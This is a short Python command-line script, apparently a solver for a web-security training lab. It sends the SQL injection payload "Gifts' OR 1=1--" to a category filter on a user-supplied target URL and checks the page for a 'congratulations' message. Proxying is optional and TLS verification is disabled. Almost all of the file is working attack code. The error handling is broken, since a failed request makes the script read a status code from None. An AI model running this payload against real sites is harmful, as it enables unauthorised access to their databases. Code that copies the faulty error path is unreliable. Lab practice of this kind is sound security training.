import argparse
import requests
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sql_injection_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',        
            'https': '127.0.0.1:8080'
        } if use_proxy else None
        
        payload = "filter?category=Gifts' OR 1=1--"
        exploit_url = urljoin(url, payload)
        
        print(f"Sending payload: {exploit_url}")
        requests.get(exploit_url, proxies=proxies, verify=False, timeout=30)
        
        return(is_solved(url, proxies))
        
            
    except requests.exceptions.RequestException as e:
        return False, None

def is_solved(url, proxies):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        if response.status_code != 200:
            return False, response
        return "congratulations" in response.text.lower(), response
    except:
        return False, None

def main():
    parser = argparse.ArgumentParser(description='SQL Injection for lab 01')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
    
    print("Starting SQL Injection Test...")
    print(f"Target URL: {args.url}")
    
    success, response = sql_injection_test(args.url, args.proxy)
    if success:
        print("SQL Injection successful")
    else:
        print(f"SQL Injection failed. HTTP Status Code: {response.status_code} Response Length: {len(response.text)}")
    

if __name__ == "__main__":
    main()
